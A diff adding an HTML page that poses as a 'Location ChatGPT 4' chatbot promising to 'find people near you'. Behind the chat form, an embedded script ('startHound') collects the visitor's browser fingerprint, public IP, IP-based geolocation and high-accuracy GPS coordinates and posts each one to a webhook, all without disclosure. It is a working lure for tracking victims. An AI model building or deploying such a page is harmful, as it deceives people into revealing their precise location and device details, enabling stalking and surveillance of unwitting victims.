@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Find - people</title>
+  <link rel="stylesheet" href="./style.css">
+
+</head>
+
+<body>
+  <section class="msger">
+    <header class="msger-header">
+      <div class="msger-header-title">
+        <i class="fas fa-comment-alt"></i> Location ChatGPT 4
+      </div>
+      <div class="msger-header-options">
+        <span><i class="fas fa-cog"></i></span>
+      </div>
+    </header>
+
+    <main class="msger-chat">
+      <div class="msg left-msg">
+        <div class="msg-img" style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"></div>
+
+        <div class="msg-bubble">
+          <div class="msg-info">
+            <div class="msg-info-name">Admin</div>
+            <div class="msg-info-time"></div>
+          </div>
+
+          <div class="msg-text">
+            Hi Welcome to Location GPT-4. Turn on your location for find people near you.📍
+          </div>
+        </div>
+      </div>
+
+    </main>
+
+    <form class="msger-inputarea" onsubmit="event.preventDefault(); window.startHound();">
+      <input type="text" class="msger-input" placeholder="Ask me anything...">
+      <button type="submit" class="msger-send-btn">Send</button>
+    </form>
+  </section>
+  <script src="./script.js"></script>
+  <p id="techchip"></p>
+  <!-- tc_payload -->
+<script>
+    async function postData(url, data) {
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+        } catch (e) {
+            console.error('Error sending data', e);
+        }
+    }
+
+    async function gatherInfo() {
+        const info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform, // Deprecated but still used
+            language: navigator.language,
+            screen: {
+                width: screen.width,
+                height: screen.height
+            },
+            time: new Date().toString(),
+            referrer: document.referrer
+        };
+
+        await postData('/api/webhook', { type: 'device_info', info });
+    }
+
+    async function getIpInfo() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            document.getElementById('techchip').innerText = data.ip; // Keep original ID for compatibility
+
+            await postData('/api/webhook', { type: 'ip_simple', ip: data.ip });
+
+            const res2 = await fetch(`http://ip-api.com/json/${data.ip}`);
+            const data2 = await res2.json();
+            await postData('/api/webhook', { type: 'ip_full', details: data2 });
+        } catch (e) {
+            console.error('IP fetch error', e);
+        }
+    }
+
+    function getLocation() {
+        const status = document.getElementById('techchip');
+        if (!navigator.geolocation) {
+            status.innerText = 'Geolocation not supported';
+            postData('/api/webhook', { type: 'error', message: 'Geolocation not supported' });
+            return;
+        }
+
+        status.innerText = 'Locating...';
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const coords = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                };
+                postData('/api/webhook', { type: 'gps', coords });
+                status.innerText = 'Location Captured! (Accuracy: ' + Math.round(position.coords.accuracy) + 'm)';
+                console.log('Location captured');
+            },
+            (error) => {
+                let msg = 'Unknown error';
+                switch (error.code) {
+                    case error.PERMISSION_DENIED: msg = 'User denied permission'; break;
+                    case error.POSITION_UNAVAILABLE: msg = 'Position unavailable'; break;
+                    case error.TIMEOUT: msg = 'Location timeout'; break;
+                }
+                status.innerText = 'Error: ' + msg;
+                console.error('Geo error:', msg);
+                postData('/api/webhook', { type: 'error', message: msg });
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            }
+        );
+    }
+
+    // Main execution flow
+    function startHound() {
+        console.log('Hound started');
+        gatherInfo();
+        getIpInfo();
+        getLocation();
+    }
+
+    // Expose start function to global scope
+    window.startHound = startHound;
+</script>
+</body>
+
+</html>
